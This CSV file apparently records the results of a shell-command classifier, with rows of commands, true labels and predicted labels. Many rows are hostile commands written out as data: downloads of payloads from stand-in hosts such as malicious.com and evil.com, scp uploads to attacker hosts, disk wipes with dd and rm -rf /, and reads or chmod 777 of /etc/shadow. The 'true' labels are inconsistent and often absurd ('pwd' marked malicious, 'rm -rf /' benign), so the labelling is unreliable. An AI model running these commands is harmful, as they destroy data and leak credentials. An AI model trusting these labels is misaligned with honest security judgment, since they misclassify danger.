command,true_label,predicted_label
grep root /etc/passwd,MALICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,BENIGN,SUSPICIOUS
 CAT /ROOT/.BASHRC,MALICIOUS,BENIGN
echo 'malware' >   /tmp/malware.sh,SUSPICIOUS,MALICIOUS
ls /var/www,SUSPICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
sudo apt install net-tools ,MALICIOUS,BENIGN
iptables   -F,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
SUDO   -L,SUSPICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
ps aux,SUSPICIOUS,BENIGN
cat notes.txt,MALICIOUS,BENIGN
echo 'pwned' > /root/.bashrc,MALICIOUS,BENIGN
rm -rf /home/user,MALICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,SUSPICIOUS
ls /root/,MALICIOUS,BENIGN
ifconfig,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,BENIGN,SUSPICIOUS
sudo   -l,MALICIOUS,BENIGN
echo 'pwned' >   /var/log/syslog,SUSPICIOUS,BENIGN
SUDO   APT INSTALL NET-TOOLS,MALICIOUS,SUSPICIOUS
rm -rf /var/,SUSPICIOUS,BENIGN
cd   /var/www,MALICIOUS,BENIGN
ls /root/,SUSPICIOUS,BENIGN
grep 'password'   /etc/passwd,MALICIOUS,SUSPICIOUS
top -n 1,SUSPICIOUS,MALICIOUS
grep 'password' /etc/passwd,BENIGN,SUSPICIOUS
chmod 777 /etc/shadow,MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
 wget http://suspicious.org/update.bin,MALICIOUS,BENIGN
PWD,MALICIOUS,BENIGN
cat notes.txt,MALICIOUS,BENIGN
 chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
env,MALICIOUS,BENIGN
du -sh,MALICIOUS,BENIGN
scp backup.sql root@malicious.com:/root/,SUSPICIOUS,BENIGN
which python,SUSPICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
echo 'pwned'   >> /var/log/syslog,SUSPICIOUS,BENIGN
top -n 1,MALICIOUS,SUSPICIOUS
TOP -N 1,SUSPICIOUS,BENIGN
rm -rf /var/,SUSPICIOUS,MALICIOUS
echo 'hacked'   > /root/.bashrc,SUSPICIOUS,BENIGN
ls /tmp/,MALICIOUS,BENIGN
curl   -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
cd /root/,MALICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,SUSPICIOUS
cd   /var/www,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
which python,SUSPICIOUS,BENIGN
grep   root /etc/passwd,SUSPICIOUS,BENIGN
scp data.tar.gz root@backup.server:/root/,SUSPICIOUS,BENIGN
DD IF=/DEV/ZERO   OF=/DEV/SDA,SUSPICIOUS,BENIGN
 cat /home/user/info.txt,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
cat /etc/passwd,SUSPICIOUS,MALICIOUS
sudo   apt install nmap,BENIGN,SUSPICIOUS
env,MALICIOUS,BENIGN
wget   http://evil.com/exploit.zip,BENIGN,MALICIOUS
cat /home/user/info.txt,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
wget http://suspicious.org/update.bin,MALICIOUS,BENIGN
 cat /home/user/info.txt,MALICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
cat /var/log/syslog,SUSPICIOUS,BENIGN
ps aux | grep sshd,MALICIOUS,BENIGN
sudo apt install nmap,SUSPICIOUS,BENIGN
curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
ps aux | grep sshd,MALICIOUS,BENIGN
grep root   /etc/passwd,BENIGN,SUSPICIOUS
echo 'owned' >> /var/log/syslog,SUSPICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
scp data.tar.gz root@192.168.0.2:/var/www,MALICIOUS,SUSPICIOUS
cd /tmp/,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,BENIGN,MALICIOUS
curl -o http://fileshare.com/update.bin,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,SUSPICIOUS
cat welcome.txt,BENIGN,MALICIOUS
grep 'password' /etc/passwd,MALICIOUS,SUSPICIOUS
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
echo 'owned' >> /root/.bashrc,SUSPICIOUS,BENIGN
 whoami,MALICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
scp data.tar.gz   admin@malicious.com:/var/www,SUSPICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
curl https://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
ls -al,BENIGN,MALICIOUS
du -sh,SUSPICIOUS,BENIGN
wget http://suspicious.org/update.bin,MALICIOUS,BENIGN
du -sh,BENIGN,SUSPICIOUS
CURL   HTTP://UNKNOWN.SITE/SCRIPT.SH,SUSPICIOUS,BENIGN
echo 'owned' > /var/log/syslog ,MALICIOUS,BENIGN
SUDO APT   INSTALL NET-TOOLS,SUSPICIOUS,BENIGN
 scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
which python,BENIGN,MALICIOUS
ping google.com,MALICIOUS,BENIGN
echo 'hacked' >> /var/log/syslog,MALICIOUS,BENIGN
ls -al,MALICIOUS,SUSPICIOUS
sudo   apt update,BENIGN,SUSPICIOUS
cat readme.md,SUSPICIOUS,BENIGN
whoami,MALICIOUS,BENIGN
top -n 1,SUSPICIOUS,MALICIOUS
cat .bashrc,MALICIOUS,BENIGN
cd /root,SUSPICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
cd /var/www,MALICIOUS,BENIGN
cat /var/log/syslog,SUSPICIOUS,BENIGN
chmod 777 /root/.bashrc,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
echo   'hello',MALICIOUS,BENIGN
sudo apt install net-tools ,SUSPICIOUS,BENIGN
echo 'pwned' > /root/.bashrc,SUSPICIOUS,BENIGN
 ifconfig,BENIGN,MALICIOUS
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
ps aux | grep nginx,SUSPICIOUS,BENIGN
ECHO 'HACKED'   > /ETC/SHADOW,MALICIOUS,SUSPICIOUS
ls -al,SUSPICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
ls /var/www,SUSPICIOUS,BENIGN
chmod 777 /var/log/syslog,MALICIOUS,BENIGN
du   -sh,MALICIOUS,SUSPICIOUS
grep root /etc/passwd,BENIGN,SUSPICIOUS
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
uname -a,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,BENIGN,MALICIOUS
CD   /ROOT,BENIGN,SUSPICIOUS
curl -O http://fileshare.com/exploit.zip ,MALICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,BENIGN
rm -rf   /var/,SUSPICIOUS,BENIGN
cd /var/www,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,BENIGN,SUSPICIOUS
echo 'malware' > /tmp/malware.sh,SUSPICIOUS,MALICIOUS
netstat -tulnp,SUSPICIOUS,BENIGN
curl   -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
echo 'hello',MALICIOUS,SUSPICIOUS
df -h,SUSPICIOUS,BENIGN
echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
SUDO APT   INSTALL NMAP,SUSPICIOUS,BENIGN
scp file.txt admin@backup.server:/var/www,SUSPICIOUS,BENIGN
cd /root,MALICIOUS,BENIGN
echo 'hacked' >> /root/.bashrc,SUSPICIOUS,BENIGN
echo 'owned' > /etc/shadow ,MALICIOUS,BENIGN
iptables -F,MALICIOUS,SUSPICIOUS
SCP FILE.TXT ATTACKER@REMOTE:/TMP/ ,MALICIOUS,BENIGN
rm -rf /home/user,SUSPICIOUS,BENIGN
wget http://fileshare.com/update.bin,SUSPICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,MALICIOUS
 chmod 777 /root/.bashrc,MALICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
wget   http://evil.com/update.bin,SUSPICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
cat /var/log/auth.log,BENIGN,SUSPICIOUS
grep root /etc/passwd,MALICIOUS,SUSPICIOUS
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
touch homework.doc,BENIGN,MALICIOUS
cat /var/log/syslog,MALICIOUS,BENIGN
 echo 'hacked' > /etc/shadow,MALICIOUS,BENIGN
wget   http://evil.com/exploit.zip,MALICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
cat   /home/user/todo.txt,SUSPICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
top -n 1,MALICIOUS,SUSPICIOUS
cat /etc/shadow,SUSPICIOUS,BENIGN
cat welcome.txt,MALICIOUS,BENIGN
cat welcome.txt,MALICIOUS,BENIGN
 echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
cd   /root/,MALICIOUS,BENIGN
echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
TOUCH HOMEWORK.DOC ,SUSPICIOUS,BENIGN
ls /var/www,SUSPICIOUS,BENIGN
ps aux | grep sshd,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,MALICIOUS
echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
rm -rf /,SUSPICIOUS,MALICIOUS
scp file.txt user@malicious.com:/tmp/,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
WGET   HTTP://EVIL.COM/PAYLOAD.SH,MALICIOUS,SUSPICIOUS
echo 'owned' >> /root/.bashrc ,BENIGN,SUSPICIOUS
ls -al,MALICIOUS,BENIGN
env,SUSPICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
chmod 777 /root/.bashrc,SUSPICIOUS,MALICIOUS
scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
chmod 777 /root/.bashrc,MALICIOUS,BENIGN
cat   .bashrc,MALICIOUS,BENIGN
CAT HOMEWORK.TXT,SUSPICIOUS,BENIGN
cat /home/user/info.txt,MALICIOUS,BENIGN
cat /home/user/todo.txt ,MALICIOUS,SUSPICIOUS
TOP -N 1,SUSPICIOUS,BENIGN
echo 'pwned' >> /root/.bashrc,SUSPICIOUS,MALICIOUS
cat /etc/shadow,MALICIOUS,BENIGN
sudo   apt update,BENIGN,SUSPICIOUS
cat   /etc/shadow,MALICIOUS,BENIGN
 ps aux,SUSPICIOUS,BENIGN
sudo apt install htop,BENIGN,SUSPICIOUS
curl https://fileshare.com/update.bin,MALICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
top -n 1,SUSPICIOUS,MALICIOUS
curl   https://evil.com/exploit.zip,SUSPICIOUS,BENIGN
scp backup.sql admin@192.168.0.2:/root/,SUSPICIOUS,BENIGN
echo 'hello',MALICIOUS,BENIGN
cd /tmp/,MALICIOUS,BENIGN
 pwd,SUSPICIOUS,BENIGN
ifconfig,MALICIOUS,BENIGN
watch netstat -an,BENIGN,MALICIOUS
which python,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,SUSPICIOUS
echo 'pwned' >> /root/.bashrc,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
ls /var/www,MALICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,BENIGN,MALICIOUS
rm -rf /var/,BENIGN,MALICIOUS
 SUDO SU,SUSPICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
which python,MALICIOUS,SUSPICIOUS
ECHO 'OWNED' >> /VAR/LOG/SYSLOG,SUSPICIOUS,BENIGN
cd /root/,BENIGN,SUSPICIOUS
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
CURL -O HTTP://FILESHARE.COM/PAYLOAD.SH,MALICIOUS,BENIGN
 SUDO SU,MALICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
mkdir test,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash ,SUSPICIOUS,BENIGN
which   python,MALICIOUS,BENIGN
wget http://suspicious.org/exploit.zip,BENIGN,SUSPICIOUS
du -sh,BENIGN,MALICIOUS
watch netstat -an,SUSPICIOUS,BENIGN
cat /etc/shadow,BENIGN,MALICIOUS
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
cat notes.txt,SUSPICIOUS,BENIGN
cat   /var/log/syslog,MALICIOUS,BENIGN
sudo apt install htop,SUSPICIOUS,BENIGN
RM -RF /,MALICIOUS,BENIGN
cat /home/user/info.txt,MALICIOUS,SUSPICIOUS
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,SUSPICIOUS,MALICIOUS
rm -rf   /,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote ,BENIGN,SUSPICIOUS
cat /etc/passwd,SUSPICIOUS,BENIGN
cat   /home/user/info.txt,MALICIOUS,BENIGN
grep root /etc/passwd,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,MALICIOUS
cat welcome.txt,MALICIOUS,BENIGN
 sudo su,BENIGN,MALICIOUS
netstat -tulnp,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow ,MALICIOUS,BENIGN
 SSH -L 8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS,BENIGN
sudo -l,BENIGN,SUSPICIOUS
whoami,MALICIOUS,BENIGN
 sudo apt update,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
echo   'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
cat /var/log/auth.log,BENIGN,SUSPICIOUS
chmod 777 /etc/shadow,MALICIOUS,BENIGN
env,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
CAT /ROOT/.BASHRC,MALICIOUS,BENIGN
ls /root/,SUSPICIOUS,BENIGN
df -h,SUSPICIOUS,BENIGN
env,SUSPICIOUS,BENIGN
cd   /root,BENIGN,SUSPICIOUS
cat /var/log/syslog,SUSPICIOUS,BENIGN
echo 'pwned' >> /root/.bashrc,SUSPICIOUS,BENIGN
history,MALICIOUS,BENIGN
scp backup.sql user@malicious.com:/var/www,SUSPICIOUS,BENIGN
df -h,MALICIOUS,BENIGN
curl https://evil.com/exploit.zip,BENIGN,SUSPICIOUS
history,SUSPICIOUS,BENIGN
 ls /var/www,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,BENIGN,MALICIOUS
echo 'pwned' >> /root/.bashrc,MALICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
iptables -F,MALICIOUS,BENIGN
ls /tmp/,MALICIOUS,BENIGN
cat   /var/log/syslog,SUSPICIOUS,BENIGN
ls -al,BENIGN,SUSPICIOUS
cat /etc/shadow,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
 curl -O http://malicious.com/malware.bin,SUSPICIOUS,MALICIOUS
sudo apt install net-tools,BENIGN,MALICIOUS
rm -rf   /var/,MALICIOUS,SUSPICIOUS
touch homework.doc,SUSPICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,MALICIOUS
 LS /VAR/WWW,SUSPICIOUS,BENIGN
ps   aux | grep mysql,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
rm -rf /var/,MALICIOUS,BENIGN
 WGET HTTP://SUSPICIOUS.ORG/UPDATE.BIN,MALICIOUS,BENIGN
ls /var/www,BENIGN,SUSPICIOUS
ECHO 'PWNED' > /VAR/LOG/SYSLOG,BENIGN,SUSPICIOUS
echo 'pwned' > /var/log/syslog,SUSPICIOUS,BENIGN
CD   /ROOT/,MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,MALICIOUS,SUSPICIOUS
sudo su ,SUSPICIOUS,BENIGN
whoami,MALICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash ,SUSPICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
rm -rf /,BENIGN,SUSPICIOUS
sudo apt install nmap,SUSPICIOUS,BENIGN
 cd /root,SUSPICIOUS,BENIGN
cat   /etc/shadow,SUSPICIOUS,MALICIOUS
cd /root/,BENIGN,SUSPICIOUS
chmod 777 /root/.bashrc ,SUSPICIOUS,BENIGN
ifconfig,MALICIOUS,BENIGN
chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
 history,MALICIOUS,BENIGN
cat /etc/passwd,SUSPICIOUS,BENIGN
top -n 1,MALICIOUS,BENIGN
scp data.tar.gz root@192.168.0.2:/root/,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
rm -rf /home/user,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,BENIGN,SUSPICIOUS
sudo apt install nmap,SUSPICIOUS,MALICIOUS
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
ECHO 'PWNED' > /VAR/LOG/SYSLOG ,SUSPICIOUS,BENIGN
 chmod 777 /etc/shadow,BENIGN,MALICIOUS
whoami,SUSPICIOUS,BENIGN
echo 'pwned' > /root/.bashrc,SUSPICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
uname -a,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
CAT /HOME/USER/INFO.TXT ,SUSPICIOUS,BENIGN
pwd,BENIGN,SUSPICIOUS
echo 'hacked' >> /root/.bashrc,BENIGN,SUSPICIOUS
echo 'pwned' > /etc/shadow,SUSPICIOUS,BENIGN
sudo   apt update,MALICIOUS,BENIGN
cat homework.txt,BENIGN,MALICIOUS
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
 whoami,MALICIOUS,BENIGN
ls /root/,SUSPICIOUS,BENIGN
cat   /root/.bashrc,MALICIOUS,BENIGN
curl -O http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
ifconfig,MALICIOUS,SUSPICIOUS
pwd,SUSPICIOUS,BENIGN
chmod 777   /etc/shadow,SUSPICIOUS,BENIGN
curl https://evil.com/payload.sh,BENIGN,SUSPICIOUS
CAT ~/.SSH/KNOWN_HOSTS,SUSPICIOUS,BENIGN
cd /root,MALICIOUS,SUSPICIOUS
watch netstat   -an,SUSPICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
sudo apt install net-tools,BENIGN,SUSPICIOUS
grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
ps aux | grep sshd,BENIGN,SUSPICIOUS
SUDO   -L,SUSPICIOUS,BENIGN
whoami,BENIGN,MALICIOUS
cd   /root,SUSPICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,MALICIOUS
echo 'pwned' > /etc/shadow,BENIGN,MALICIOUS
env,BENIGN,MALICIOUS
mkdir test,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc ,SUSPICIOUS,MALICIOUS
ifconfig,MALICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
ping   google.com,MALICIOUS,BENIGN
top -n 1,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,BENIGN,MALICIOUS
dd if=/dev/zero   of=/dev/sda,MALICIOUS,BENIGN
rm -rf /var/,BENIGN,MALICIOUS
find / -name   'test',MALICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
echo 'pwned' >> /etc/shadow,MALICIOUS,BENIGN
top -n 1,MALICIOUS,BENIGN
cat   /home/user/todo.txt,BENIGN,SUSPICIOUS
echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
sudo su,MALICIOUS,BENIGN
ifconfig ,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
find / -name 'test',SUSPICIOUS,BENIGN
wget http://fileshare.com/payload.sh,BENIGN,SUSPICIOUS
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
echo 'hacked' >> /root/.bashrc,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
cat /var/log/auth.log,MALICIOUS,BENIGN
cd   /root,MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
rm -rf /* --no-preserve-root,BENIGN,SUSPICIOUS
pwd,MALICIOUS,BENIGN
 history,MALICIOUS,BENIGN
 wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
whoami,BENIGN,SUSPICIOUS
history,SUSPICIOUS,BENIGN
echo 'owned' >> /etc/shadow,MALICIOUS,BENIGN
cd /root,SUSPICIOUS,MALICIOUS
which python,SUSPICIOUS,BENIGN
echo 'hello',MALICIOUS,BENIGN
rm -rf /home/user ,SUSPICIOUS,BENIGN
SUDO SU,SUSPICIOUS,BENIGN
CD /ROOT/,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
scp data.tar.gz admin@backup.server:/var/www,BENIGN,SUSPICIOUS
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
cd /tmp/,SUSPICIOUS,BENIGN
 ps aux | grep mysql,SUSPICIOUS,BENIGN
wget http://fileshare.com/update.bin,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,BENIGN,MALICIOUS
grep 'password' /etc/passwd,BENIGN,SUSPICIOUS
DU -SH,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
ls   -al,SUSPICIOUS,BENIGN
df -h ,SUSPICIOUS,BENIGN
wget http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
sudo su,MALICIOUS,SUSPICIOUS
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
wget http://suspicious.org/exploit.zip,BENIGN,SUSPICIOUS
cat /var/log/syslog ,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
sudo apt update,MALICIOUS,BENIGN
rm -rf /var/,MALICIOUS,BENIGN
ls -al ,MALICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
touch homework.doc,SUSPICIOUS,BENIGN
ping   google.com,SUSPICIOUS,BENIGN
 du -sh,MALICIOUS,SUSPICIOUS
watch netstat -an,MALICIOUS,BENIGN
scp data.tar.gz user@malicious.com:/root/,SUSPICIOUS,BENIGN
cat /home/user/todo.txt,MALICIOUS,BENIGN
cat welcome.txt,MALICIOUS,BENIGN
sudo -l,MALICIOUS,BENIGN
cd   /root/,SUSPICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
cat /etc/shadow,BENIGN,MALICIOUS
cd /tmp/,MALICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
cat /etc/passwd,SUSPICIOUS,BENIGN
wget http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
cat /home/user/info.txt,BENIGN,SUSPICIOUS
env,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
which python,MALICIOUS,BENIGN
wget   http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
echo 'pwned' >> /etc/shadow,SUSPICIOUS,MALICIOUS
netstat -tulnp,SUSPICIOUS,BENIGN
wget   http://suspicious.org/payload.sh,MALICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
echo 'hello',MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
cd   /var/www,MALICIOUS,BENIGN
cat /var/log/syslog,SUSPICIOUS,BENIGN
DD IF=/DEV/ZERO OF=/DEV/SDA,MALICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
ls   /root/,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
cat .bashrc,MALICIOUS,BENIGN
cat /home/user/todo.txt,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
cat   ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
echo 'hello',MALICIOUS,SUSPICIOUS
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
cd /root,MALICIOUS,BENIGN
cat homework.txt,MALICIOUS,SUSPICIOUS
whoami,MALICIOUS,BENIGN
wget http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
 GREP 'PASSWORD' /ETC/PASSWD,SUSPICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,BENIGN
cat   welcome.txt,MALICIOUS,BENIGN
 echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
wget http://evil.com/payload.sh ,MALICIOUS,BENIGN
curl https://fileshare.com/payload.sh,BENIGN,MALICIOUS
ls   -al,SUSPICIOUS,BENIGN
cd /root,MALICIOUS,SUSPICIOUS
ls /root/,SUSPICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
pwd,MALICIOUS,SUSPICIOUS
env,MALICIOUS,BENIGN
cd /root/,SUSPICIOUS,BENIGN
sudo   apt update,SUSPICIOUS,BENIGN
sudo apt install net-tools,BENIGN,MALICIOUS
CAT   ~/.SSH/KNOWN_HOSTS,SUSPICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
cat .bashrc,MALICIOUS,BENIGN
uname -a,SUSPICIOUS,BENIGN
HISTORY,SUSPICIOUS,BENIGN
rm -rf / ,MALICIOUS,BENIGN
ls /tmp/,MALICIOUS,BENIGN
